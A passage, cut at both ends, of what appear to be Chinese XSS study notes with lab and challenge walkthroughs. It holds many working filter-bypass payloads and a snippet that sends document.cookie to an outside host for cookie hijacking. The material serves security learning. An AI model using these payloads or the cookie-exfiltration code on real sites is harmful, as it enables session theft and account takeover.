转义序列存在于字符串中时，它只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。这项内容清楚地写在 ECMAScript 中。因此，Unicode 转义序列将永远不会破环字符串上下文，因为它们只能被解释成字符串常量。</p>\n<p>标识符名称中：当 Unicode 转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。这可以用来解释问题 10。如果我们深入研究 JavaScript 细则，可以看到如下内容：</p>\n<p>“Unicode 转义序列（如 \\u000A\\u000B）同样被允许用在标识符名称中，被当作名称中的一个字符。而将’' 符号前置在 Unicode 转义序列串（如 \\u000A000B000C）并不能作为标识符名称中的字符。将 Unicode 转义序列串放在标识符名称中是非法的。”</p>\n<p>总的来说，Unicode 转义序列只有在标识符名称里不被当作字符串，也只有在标识符名称里的编码字符能够被正常的解析。如果我们回看问题 11，它并不会被执行。因为 “(11)” 不会被正确的解析，而 “alert (11)” 也不是一个有效的标识符名称。问题 12 不会被正确执行要么是因为’\\u0031\\u0032’不会被解释为字符串常量（因为它们没有用引号闭合）要么是因为它们是 ASCII 型数字。问题 13 不会执行的原因是’\\u0027’仅仅会被解释成单引号文本，而此时字符串是未闭合的。问题 14 能够执行的原因是’\\u000a’会被解释成换行符文本，这并不会导致真正的换行从而引发 JavaScript 语法错误。</p>\n<p>即 () 和 里面的东西都不能编码</p>\n<h2 id=\"xss攻击方式\"><a class=\"markdownIt-Anchor\" href=\"#xss攻击方式\">#</a> XSS 攻击方式</h2>\n<h3 id=\"1读取浏览器cookie对象发起cookie劫持\"><a class=\"markdownIt-Anchor\" href=\"#1读取浏览器cookie对象发起cookie劫持\">#</a> 1. 读取浏览器 cookie 对象，发起 cookie 劫持</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var img = document.createElement(&quot;img&quot;);</span><br><span class=\"line\">img.src = &quot;http://www.eval.com/log?&quot; + escape(document.cookie);</span><br><span class=\"line\">document.body.append(img);</span><br></pre></td></tr></table></figure>\n<p>使用 httponly 标识可以防止 cookie 劫持</p>\n<h3 id=\"2模拟postget请求操作用户的浏览器\"><a class=\"markdownIt-Anchor\" href=\"#2模拟postget请求操作用户的浏览器\">#</a> 2. 模拟 POST，GET 请求操作用户的浏览器</h3>\n<p>在 cookie 劫持失效时或是在目标用户的网络不能访问互联网时</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.抓包分析浏览器发送的请求</span><br><span class=\"line\">2.构造完整url，使用XMLHTTPRequest或者form表单请求此url</span><br></pre></td></tr></table></figure>\n<h3 id=\"3xss钓鱼\"><a class=\"markdownIt-Anchor\" href=\"#3xss钓鱼\">#</a> 3.XSS 钓鱼</h3>\n<p>通过伪造登录框获取用户的用户名和密码，在将密码和用户名发送到自己服务器上</p>\n<h3 id=\"4获取用户信息\"><a class=\"markdownIt-Anchor\" href=\"#4获取用户信息\">#</a> 4. 获取用户信息</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.识别用户浏览器，根据每个浏览器特有的功能</span><br><span class=\"line\">2.识别用户安装的软件或浏览器插件</span><br><span class=\"line\">3.查询用户访问过的连接</span><br><span class=\"line\">4.获取用户真实IP</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"xsslab\"><a class=\"markdownIt-Anchor\" href=\"#xsslab\">#</a> XSSlab</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veHl6MzE1L3AvMTQ4NTAzNTkuaHRtbA==\">https://www.cnblogs.com/xyz315/p/14850359.html</span></p>\n<p>Level - 1</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//192.168.1.6:18888/xss/level1.php?name=test</span></span><br><span class=\"line\"></span><br><span class=\"line\">?name=&lt;script&gt;<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">?name=&lt;input onclick/onmouseover&gt;</span><br><span class=\"line\">?name=&lt;a onclick/javascript&gt;</span><br><span class=\"line\">?name=&lt;img src&gt;</span><br><span class=\"line\">?name=&lt;iframe&gt;</span><br><span class=\"line\">?name=&lt;svg&gt;</span><br><span class=\"line\">?name=&lt;video onloadstart=<span class=\"title function_ invoke__\">alert</span>(<span class=\"number\">1</span>) src=<span class=\"string\">&quot;/media/hack-the-plant.mp4&quot;</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>闭合 大小写 双写 编码</p>\n<p>Level 10</p>\n<p>?keyword=111&amp;t_sort=1 type=“text” onclick=alert(1)</p>\n<p>?keyword=111&amp;t_sort=1 type=“text” onfocus=alert(1) autofocus=&quot;true</p>\n<p>Level 11</p>\n<p>Post 提交 referer</p>\n<h2 id=\"模板字符串\"><a class=\"markdownIt-Anchor\" href=\"#模板字符串\">#</a> 模板字符串</h2>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//弹窗，因为有tostring方法，把数组中第一个参数转为字符串</span></span><br><span class=\"line\">alert<span class=\"string\">`a`</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span>    </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，因为有$&#123;&#125;执行表达式</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，相当于2前后加了个字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`a<span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>b`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"string\">&#x27;b&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，因为没有tostring，会放在数组中输出</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`a`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;a&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，和上一条一样</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`alert(1)`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;alert(1)&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">1</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，和3一样</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`alert(1) <span class=\"subst\">$&#123;alert(<span class=\"number\">1</span>)&#125;</span>`</span></span><br><span class=\"line\">(<span class=\"number\">2</span>) [<span class=\"string\">&#x27;alert(1) &#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，此时不是模板字符串，是函数</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，虽然有$&#123;&#125;执行表达式，但此时alert是字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert(1)&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//不弹，虽然可以字符串中解析16进制和Unicode，但此时解析完后仍然为字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert\\x281\\x29&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"attr\">raw</span>: <span class=\"title class_\">Array</span>(<span class=\"number\">2</span>)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//上面都是先解析$&#123;&#125;，最后在解析eval</span></span><br><span class=\"line\"><span class=\"comment\">//对于call方法</span></span><br><span class=\"line\"><span class=\"comment\">//弹窗</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"string\">&#x27;alert(1)&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，此时相当于eval(&#x27;alert(1)&#x27;),call相当于将eval内的执行</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span>.<span class=\"property\">call</span><span class=\"string\">`<span class=\"subst\">$&#123;<span class=\"string\">&#x27;alert\\x281\\x29&#x27;</span>&#125;</span>`</span></span><br><span class=\"line\"><span class=\"literal\">undefined</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//弹窗，前面的eval相当于tag，模板字符串前可以有tag，注意返回值的不同，此时返回的不是数组 </span></span><br><span class=\"line\"><span class=\"string\">`aaa <span class=\"subst\">$&#123;alert<span class=\"string\">`1`</span>&#125;</span> bbbb`</span></span><br><span class=\"line\"><span class=\"string\">&#x27;aaa undefined bbbb&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//报错，不能对符号编码，因此的prompt不是字符串</span></span><br><span class=\"line\"><span class=\"built_in\">eval</span><span class=\"string\">`<span class=\"subst\">$&#123;prompt\\x281\\x29&#125;</span>`</span></span><br><span class=\"line\"><span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>aaa$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;bbb<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//不弹</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span><span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//如果aaaa全局有定义返回变量对应的值，没有定义则not define 报错</span></span><br><span class=\"line\"><span class=\"string\">eval(&#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//返回[&quot;aaaaaaaaa&quot;]</span></span><br><span class=\"line\"><span class=\"string\">eval([&quot;aaaaaaaaa&quot;]);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//eval只能接收第一个参数的值，他只有一个参数</span></span><br><span class=\"line\"><span class=\"string\">eval`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//`</span><span class=\"string\">`两端字符串依然为空，但中间是一个字符串不是函数，此时第二个参数为&#x27;prompt(1)&#x27;,但eval不接</span></span><br><span class=\"line\"><span class=\"string\">eval`</span>$&#123;<span class=\"string\">&#x27;prompt(1)&#x27;</span>&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//输入11111,打印11111.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象window中有prompt函数，执行eval(&#x27;prompt(1)&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">eval(&#x27;prompt(1)&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;11111&#x27;</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"string\">&#x27;prompt(1)&#x27;</span>&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">&#x27;11111&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//输入aaaa,打印aaaa undefined.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象没有aaaa方法，返回undefined,但注意如果输入为数字那么原样返回</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">Uncaught ReferenceError: aaaa is not defined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//eval别名调用，指向全局变量，因为js不允许指向prompt.第二个参数没传值，因此返回undefined</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span><span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br></pre></td></tr></table></figure>\n<p>模板字符串中需要有表达式 ${} 才能执行 eval``</p>\n<p>eval () 是个函数，会将传入的字符串当做代码执行，如果全局没有该字符串变量，会报错 undefined，如果传入的不是字符串，eval 会将参数直接返回</p>\n<p>alert 有 tostring 方法，将数字专为字符串执行</p>\n<p>eval 没有 tostring，将数字放入数组中</p>\n<p>模板字符串可以解析 16 进制和 Unicode</p>\n<p>call 用来改变 this 指向</p>\n<h2 id=\"httpsxsshaozime\"><a class=\"markdownIt-Anchor\" href=\"#httpsxsshaozime\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MuaGFvemkubWUv\">https://xss.haozi.me/</span></h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDA3NzU0NC9hcnRpY2xlL2RldGFpbHMvOTUwOTQ3NTk=\">https://blog.csdn.net/weixin_44077544/article/details/95094759</span></p>\n<p>0x03</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:alert&amp;#40;1&amp;#41;&quot;&gt;aaa</span><br><span class=\"line\">&lt;img src=1 onerror=&quot;alert`1`&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>0x05</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;--!</span><br></pre></td></tr></table></figure>\n<p>0x06</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onclick</span><br><span class=\"line\">=alert(1)</span><br><span class=\"line\"></span><br><span class=\"line\">type=&quot;image&quot; src=1 onerror=</span><br><span class=\"line\">alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x07</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;//</span><br></pre></td></tr></table></figure>\n<p>0x08</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;/style</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&lt;script&gt;alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x09</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=https://www/segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure>\n<p>0x0A</p>\n<p>只有 Firefox 可以进行跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.segmentfault.com@xss.haozi.com/j.js</span><br></pre></td></tr></table></figure>\n<p>http/https @ 会匹配后面一个并进行重定向</p>\n<p>ftp @前是用户名，后是 password</p>\n<p>0x0B</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class=\"line\">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class=\"line\">&lt;scripscriptt src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/scripscriptt&gt;</span><br><span class=\"line\">&lt;cript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/cript&gt;</span><br></pre></td></tr></table></figure>\n<p>0x0C</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">同0x0B</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x0D</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">111</span><br><span class=\"line\">alert(1)</span><br><span class=\"line\">--&gt; </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220912152740785.png\" alt=\"image-20220912152740785\"></p>\n<p>0x0E</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ſ用在有转大写时</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/ſcript&gt;</span><br><span class=\"line\">&lt;ſvg onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x0F</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;);alert(1)//</span><br></pre></td></tr></table></figure>\n<p>0x10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">执行 `中的代码,es6模板字符串</span><br><span class=\"line\"></span><br><span class=\"line\">alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;?;alert(1)/.</span><br></pre></td></tr></table></figure>\n<h2 id=\"prompt1\"><a class=\"markdownIt-Anchor\" href=\"#prompt1\">#</a> prompt(1)</h2>\n<p>2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval.call</span><br><span class=\"line\">prompt`1`</span><br><span class=\"line\">&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)   切换命名空间</span><br><span class=\"line\">最好不要编码符号</span><br></pre></td></tr></table></figure>\n<p>5</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaa&quot; onerror</span><br><span class=\"line\">=&quot;prompt(1)&quot; src=111 type=&quot;image </span><br></pre></td></tr></table></figure>\n<p>6</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;中注入</span><br><span class=\"line\">// e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class=\"line\">&lt;form action=&quot;http://httpbin.org/post&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;</span><br><span class=\"line\">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;Matt&quot;&#125;</span><br><span class=\"line\">&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;     </span><br><span class=\"line\">通过input action覆盖form action</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;                                                  \\n\\</span><br><span class=\"line\">    // forbid javascript: or vbscript: and data: stuff    \\n\\</span><br><span class=\"line\">    if (!/script:|data:/i.test(document.forms[0].action)) \\n\\</span><br><span class=\"line\">        document.forms[0].submit();                       \\n\\</span><br><span class=\"line\">    else                                                  \\n\\</span><br><span class=\"line\">        document.write(&quot;Action forbidden.&quot;)               \\n\\</span><br><span class=\"line\">&lt;/script&gt;   </span><br></pre></td></tr></table></figure>\n<p>7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;script&gt;/*#*/prompt/*#*/(1)/*#*/&lt;/script&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/prompt/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/(1)/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt;&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U+005C:反斜杠(reverse solidus)</span><br><span class=\"line\">U+000D:回车 (carriage return)</span><br><span class=\"line\">U+2028:行分隔符(line separator)</span><br><span class=\"line\">U+2029∶段分隔符(paragraph separator)</span><br><span class=\"line\">u+000A:换行符（line feed)</span><br><span class=\"line\">&#x27;\\u2028prompt(1)\\u2028--&gt;&#x27;</span><br></pre></td></tr></table></figure>\n<p>10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">prom&#x27;pt(1)</span><br></pre></td></tr></table></figure>\n<p>11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 